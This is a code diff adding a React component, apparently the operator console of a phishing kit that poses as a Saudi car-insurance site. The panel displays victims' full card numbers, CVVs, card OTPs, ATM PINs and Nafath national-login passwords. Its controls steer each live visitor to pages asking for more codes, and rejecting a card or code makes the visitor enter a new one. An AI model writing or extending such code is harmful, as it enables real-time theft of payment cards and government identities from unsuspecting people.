@@ -1,0 +1,482 @@
+"use client"
+
+import { ChevronDown } from "lucide-react"
+import type { InsuranceApplication } from "@/lib/firestore-types"
+import { useState } from "react"
+import { updateApplication } from "@/lib/firebase-services"
+import { DataBubble } from "./data-bubble"
+
+interface VisitorDetailsProps {
+  visitor: InsuranceApplication | null
+}
+
+export function VisitorDetails({ visitor }: VisitorDetailsProps) {
+  const [isNavigating, setIsNavigating] = useState(false)
+
+  if (!visitor) {
+    return (
+      <div className="flex-1 flex items-center justify-center bg-gray-50">
+        <div className="text-center text-gray-500">
+          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
+        </div>
+      </div>
+    )
+  }
+
+  const handleNavigate = async (destination: string) => {
+    if (!visitor.id || isNavigating) return
+    
+    setIsNavigating(true)
+    
+    try {
+      let updates: Partial<InsuranceApplication> = {}
+      
+      switch (destination) {
+        case "home":
+          updates = { currentStep: 1 }
+          break
+        case "payment":
+          updates = { currentStep: 4 }
+          break
+        case "otp":
+          updates = { currentStep: 4, otpStatus: "show_otp" as any }
+          break
+        case "pin":
+          updates = { currentStep: 4, otpStatus: "show_pin" as any }
+          break
+        case "phone":
+          updates = { currentStep: 5 }
+          break
+        case "phone_otp":
+          updates = { currentStep: 5, phoneOtpStatus: "show_phone_otp" as any }
+          break
+        case "nafad":
+          updates = { currentStep: 6 }
+          break
+      }
+      
+      if (Object.keys(updates).length > 0) {
+        await updateApplication(visitor.id, updates)
+        alert(`تم توجيه الزائر بنجاح!`)
+      }
+    } catch (error) {
+      console.error("Navigation error:", error)
+      alert(`حدث خطأ في التوجيه: ${error}`)
+    } finally {
+      setIsNavigating(false)
+    }
+  }
+
+  // Action handlers
+  const handleCardOtp = async () => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { otpStatus: "show_otp" as any })
+    alert("تم توجيه الزائر لإدخال كود OTP")
+  }
+
+  const handleCardPin = async () => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { otpStatus: "show_pin" as any })
+    alert("تم توجيه الزائر لإدخال رقم PIN")
+  }
+
+  const handleCardReject = async () => {
+    if (!visitor.id) return
+    if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
+      // Clear card data and codes, set status to rejected, then redirect to payment
+      await updateApplication(visitor.id, { 
+        otpStatus: "otp_rejected" as any,
+        otpCode: "",
+        pinCode: "",
+        cardNumber: "",
+        cardType: "",
+        expiryDate: "",
+        cvv: ""
+      })
+      // After a short delay, redirect to payment page
+      setTimeout(async () => {
+        await updateApplication(visitor.id!, { currentStep: "payment" as any })
+      }, 500)
+      alert("تم رفض البطاقة وسيتم توجيه الزائر لإدخال بطاقة جديدة")
+    }
+  }
+
+  const handleOtpApprove = async () => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { otpStatus: "approved" as any })
+    alert("تم قبول كود OTP")
+  }
+
+  const handleOtpReject = async () => {
+    if (!visitor.id) return
+    // Clear the old OTP code and set status to rejected, then redirect to show_otp
+    await updateApplication(visitor.id, { 
+      otpStatus: "rejected" as any,
+      otpCode: "" // Clear the old code
+    })
+    // After a short delay, redirect to OTP input
+    setTimeout(async () => {
+      await updateApplication(visitor.id!, { otpStatus: "show_otp" as any })
+    }, 500)
+    alert("تم رفض كود OTP وسيتم توجيه الزائر لإدخال كود جديد")
+  }
+
+  const handlePhoneApprove = async () => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { phoneOtpStatus: "approved" as any })
+    alert("تم قبول رقم الهاتف")
+  }
+
+  const handlePhoneReject = async () => {
+    if (!visitor.id) return
+    // Clear the old phone verification code and set status to rejected
+    await updateApplication(visitor.id, { 
+      phoneOtpStatus: "rejected" as any,
+      phoneOtp: "" // Clear the old code
+    })
+    // After a short delay, redirect to phone OTP input
+    setTimeout(async () => {
+      await updateApplication(visitor.id!, { phoneOtpStatus: "show_phone_otp" as any })
+    }, 500)
+    alert("تم رفض كود الهاتف وسيتم توجيه الزائر لإدخال كود جديد")
+  }
+
+  const handlePhoneResend = async () => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { phoneOtpStatus: "show_phone_otp" as any })
+    alert("تم توجيه الزائر لإعادة إدخال كود الهاتف")
+  }
+
+  const handleNafadSubmit = async (code: string) => {
+    if (!visitor.id) return
+    await updateApplication(visitor.id, { nafadConfirmationCode: code })
+    alert(`تم إرسال رقم التأكيد: ${code}`)
+  }
+
+  // Prepare bubbles data
+  const bubbles: any[] = []
+  
+  // Helper function to get status label
+  const getStatusLabel = (status: string | undefined) => {
+    if (!status) return undefined
+    switch (status) {
+      case "approved": return "✓ تم القبول"
+      case "rejected": 
+      case "otp_rejected": return "✗ تم الرفض"
+      case "verifying": return "⏳ قيد التحقق"
+      case "show_otp":
+      case "show_pin":
+      case "show_phone_otp": return "⌛ في انتظار الإدخال"
+      default: return status
+    }
+  }
+
+  // 1. Basic Info (always show if exists)
+  if (visitor.ownerName || visitor.identityNumber) {
+    bubbles.push({
+      title: "معلومات أساسية",
+      data: {
+        "الاسم": visitor.ownerName,
+        "رقم الهوية": visitor.identityNumber,
+        "رقم الهاتف": visitor.phoneNumber,
+        "نوع الوثيقة": visitor.documentType
+      },
+      timestamp: visitor.createdAt
+    })
+  }
+
+  // 2. Insurance Details
+  if (visitor.insuranceCoverage) {
+    bubbles.push({
+      title: "تفاصيل التأمين",
+      data: {
+        "نوع التغطية": visitor.insuranceCoverage,
+        "موديل المركبة": visitor.vehicleModel,
+        "قيمة المركبة": visitor.vehicleValue,
+        "سنة الصنع": visitor.vehicleYear,
+        "استخدام المركبة": visitor.vehicleUsage,
+        "موقع الإصلاح": visitor.repairLocation === 'agency' ? 'وكالة' : 'ورشة'
+      },
+      timestamp: visitor.updatedAt
+    })
+  }
+
+  // 3. Selected Offer
+  if (visitor.selectedOffer) {
+    bubbles.push({
+      title: "العرض المختار",
+      data: {
+        "الشركة": (visitor.selectedOffer as any).name || visitor.selectedOffer.company,
+        "السعر الأصلي": visitor.originalPrice,
+        "الخصم": visitor.discount ? `${(visitor.discount * 100).toFixed(0)}%` : undefined,
+        "السعر النهائي": visitor.finalPrice || visitor.offerTotalPrice,
+        "المميزات المختارة": visitor.selectedFeatures?.join(", ") || "لا يوجد"
+      },
+      timestamp: visitor.updatedAt
+    })
+  }
+
+  // 4. Card Info - Show all cards from history + current
+  const cardAttempts: any[] = []
+  
+  // Get cards from history
+  if (visitor.history && Array.isArray(visitor.history)) {
+    visitor.history.forEach((entry: any) => {
+      if (entry.data?.cardNumber) {
+        cardAttempts.push({
+          cardNumber: entry.data.cardNumber,
+          cardType: entry.data.cardType,
+          expiryDate: entry.data.expiryDate,
+          cvv: entry.data.cvv,
+          bankInfo: entry.data.bankInfo,
+          paymentMethod: entry.data.paymentMethod,
+          timestamp: entry.timestamp,
+          status: entry.data.cardStatus || entry.data.otpStatus,
+          otpCode: entry.data.otpCode,
+          pinCode: entry.data.pinCode
+        })
+      }
+    })
+  }
+  
+  // Add current card if exists
+  if (visitor.cardNumber) {
+    cardAttempts.push({
+      cardNumber: visitor.cardNumber,
+      cardType: visitor.cardType,
+      expiryDate: visitor.expiryDate,
+      cvv: visitor.cvv,
+      bankInfo: visitor.bankInfo,
+      paymentMethod: visitor.paymentMethod,
+      timestamp: visitor.updatedAt,
+      status: visitor.otpStatus,
+      otpCode: visitor.otpCode,
+      pinCode: visitor.pinCode,
+      isCurrent: true
+    })
+  }
+  
+  // Create bubbles for each card attempt
+  cardAttempts.forEach((card, index) => {
+    const statusLabel = getStatusLabel(card.status)
+    bubbles.push({
+      title: `معلومات البطاقة${cardAttempts.length > 1 ? ` #${cardAttempts.length - index}` : ''}`,
+      data: {
+        "رقم البطاقة": card.cardNumber,
+        "نوع البطاقة": card.cardType,
+        "تاريخ الانتهاء": card.expiryDate,
+        "CVV": card.cvv,
+        "البنك": card.bankInfo?.name,
+        "بلد البنك": card.bankInfo?.country,
+        "طريقة الدفع": card.paymentMethod,
+        "الحالة": statusLabel
+      },
+      timestamp: card.timestamp,
+      showCardActions: card.isCurrent && !card.otpCode && !card.pinCode,
+      status: card.status
+    })
+  })
+
+  // 5. OTP Code - Show all OTP attempts from history + current
+  const otpAttempts: any[] = []
+  
+  // Get OTP codes from history
+  if (visitor.history && Array.isArray(visitor.history)) {
+    visitor.history.forEach((entry: any) => {
+      if (entry.data?.otpCode || entry.data?.otpStatus) {
+        otpAttempts.push({
+          otpCode: entry.data.otpCode,
+          otpStatus: entry.data.otpStatus,
+          timestamp: entry.timestamp
+        })
+      }
+    })
+  }
+  
+  // Add current OTP if exists
+  const currentOtpCode = visitor.otpCode || (visitor as any).cardOtp || (visitor as any).otp
+  if (currentOtpCode || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying" || visitor.otpStatus === "approved" || visitor.otpStatus === "rejected") {
+    otpAttempts.push({
+      otpCode: currentOtpCode,
+      otpStatus: visitor.otpStatus,
+      timestamp: visitor.updatedAt,
+      isCurrent: true
+    })
+  }
+  
+  // Create bubbles for each OTP attempt
+  otpAttempts.forEach((otp, index) => {
+    const statusLabel = getStatusLabel(otp.otpStatus)
+    bubbles.push({
+      title: `كود OTP${otpAttempts.length > 1 ? ` #${otpAttempts.length - index}` : ''}`,
+      data: {
+        "الكود": otp.otpCode || "في انتظار إدخال الكود...",
+        "الحالة": statusLabel
+      },
+      timestamp: otp.timestamp,
+      showOtpActions: otp.isCurrent && otp.otpCode && otp.otpStatus !== "approved" && otp.otpStatus !== "rejected",
+      status: otp.otpStatus
+    })
+  })
+
+  // 6. PIN Code - Show all PIN attempts from history + current
+  const pinAttempts: any[] = []
+  
+  // Get PIN codes from history
+  if (visitor.history && Array.isArray(visitor.history)) {
+    visitor.history.forEach((entry: any) => {
+      if (entry.data?.pinCode || entry.data?.pinStatus) {
+        pinAttempts.push({
+          pinCode: entry.data.pinCode,
+          pinStatus: entry.data.pinStatus || entry.data.otpStatus,
+          timestamp: entry.timestamp
+        })
+      }
+    })
+  }
+  
+  // Add current PIN if exists
+  const currentPinCode = visitor.pinCode || (visitor as any).cardPin || (visitor as any).pin
+  if (currentPinCode || visitor.otpStatus === "show_pin") {
+    pinAttempts.push({
+      pinCode: currentPinCode,
+      pinStatus: visitor.otpStatus,
+      timestamp: visitor.updatedAt,
+      isCurrent: true
+    })
+  }
+  
+  // Create bubbles for each PIN attempt
+  pinAttempts.forEach((pin, index) => {
+    const statusLabel = getStatusLabel(pin.pinStatus)
+    bubbles.push({
+      title: `كود PIN${pinAttempts.length > 1 ? ` #${pinAttempts.length - index}` : ''}`,
+      data: {
+        "الكود": pin.pinCode || "في انتظار إدخال الكود...",
+        "الحالة": statusLabel
+      },
+      timestamp: pin.timestamp,
+      status: pin.pinStatus
+    })
+  })
+
+  // 7. Phone Basic Info (from /phone-info page)
+  if (visitor.phoneNumber || (visitor as any).phoneCarrier) {
+    bubbles.push({
+      title: "معلومات الهاتف",
+      data: {
+        "رقم الجوال": visitor.phoneNumber,
+        "شركة الاتصالات": (visitor as any).phoneCarrier
+      },
+      timestamp: visitor.updatedAt
+    })
+  }
+  // 8. Phone Verification Code
+  if (visitor.phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
+    bubbles.push({
+      title: "كود تحقق الهاتف",
+      data: {
+        "كود التحقق": visitor.phoneOtp || "في انتظار إدخال الكود...",
+        "الحالة": visitor.phoneOtpStatus === "show_phone_otp" ? "تم توجيه الزائر لإدخال كود الهاتف" : 
+                  visitor.phoneOtpStatus === "verifying" ? "جاري التحقق..." :
+                  visitor.phoneOtpStatus === "approved" ? "تم القبول" :
+                  visitor.phoneOtpStatus === "rejected" ? "تم الرفض" : undefined
+      },
+      timestamp: visitor.updatedAt,
+      showPhoneActions: !!(visitor.phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected")
+    })
+  }
+
+  // 9. Nafad Info
+  if (visitor.nafazId || visitor.nafazPass) {
+    bubbles.push({
+      title: "معلومات نفاذ",
+      data: {
+        "رقم الهوية": visitor.nafazId,
+        "كلمة المرور": visitor.nafazPass,
+        ...(visitor.nafadConfirmationCode && { "رقم التأكيد": visitor.nafadConfirmationCode })
+      },
+      timestamp: visitor.updatedAt,
+      showNafadInput: true // Always show input to allow multiple submissions
+    })
+  }
+
+  return (
+    <div className="flex-1 flex flex-col bg-gray-50" style={{ fontFamily: 'Cairo, Tajawal, sans-serif' }}>
+      {/* Header */}
+      <div className="bg-white border-b border-gray-200 p-4">
+        <div className="flex items-center justify-between">
+          <div className="flex-1">
+            <h2 className="text-xl font-bold text-gray-900">{visitor.ownerName}</h2>
+            <div className="flex items-center gap-4 mt-1 text-sm text-gray-600">
+              <span>الهوية: {visitor.identityNumber}</span>
+              <span>الهاتف: {visitor.phoneNumber}</span>
+            </div>
+          </div>
+          
+          <div className="flex items-center gap-4">
+            {/* Online Status */}
+            <div className="flex items-center gap-2">
+              <div className={`w-3 h-3 rounded-full ${visitor.online ? 'bg-green-500' : 'bg-gray-400'}`}></div>
+              <span className="text-sm text-gray-600">{visitor.online ? 'متصل' : 'غير متصل'}</span>
+            </div>
+
+            {/* Navigation Dropdown */}
+            <div className="relative">
+              <select
+                onChange={(e) => handleNavigate(e.target.value)}
+                disabled={isNavigating}
+                className="appearance-none bg-green-600 text-white px-4 py-2 pr-10 rounded-lg text-sm font-medium cursor-pointer hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                value=""
+              >
+                <option value="" disabled>توجيه الزائر إلى</option>
+                <option value="home">الرئيسية</option>
+                <option value="payment">بطاقة الدفع</option>
+                <option value="otp">كود تحقق البطاقة</option>
+                <option value="pin">رقم الصراف</option>
+                <option value="phone">الهاتف</option>
+                <option value="phone_otp">كود الهاتف</option>
+                <option value="nafad">نفاذ</option>
+              </select>
+              <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white pointer-events-none" />
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Content - Bubbles */}
+      <div className="flex-1 overflow-y-auto p-4">
+        <div className="max-w-4xl mx-auto space-y-4">
+          {bubbles.length === 0 ? (
+            <div className="bg-white rounded-lg shadow-sm p-6 text-center text-gray-500">
+              <p className="text-lg">لا توجد بيانات لعرضها</p>
+              <p className="text-sm mt-2">سيتم عرض البيانات عند إدخالها من قبل الزائر</p>
+            </div>
+          ) : (
+            bubbles.reverse().map((bubble, index) => (
+              <DataBubble
+                key={index}
+                title={bubble.title}
+                data={bubble.data}
+                timestamp={bubble.timestamp}
+                showCardActions={bubble.showCardActions}
+                showOtpActions={bubble.showOtpActions}
+                showPhoneActions={bubble.showPhoneActions}
+                showNafadInput={bubble.showNafadInput}
+                onCardOtp={handleCardOtp}
+                onCardPin={handleCardPin}
+                onCardReject={handleCardReject}
+                onOtpApprove={handleOtpApprove}
+                onOtpReject={handleOtpReject}
+                onPhoneApprove={handlePhoneApprove}
+                onPhoneReject={handlePhoneReject}
+                onPhoneResend={handlePhoneResend}
+                onNafadSubmit={handleNafadSubmit}
+              />
+            ))
+          )}
+        </div>
+      </div>
+    </div>
+  )
+}
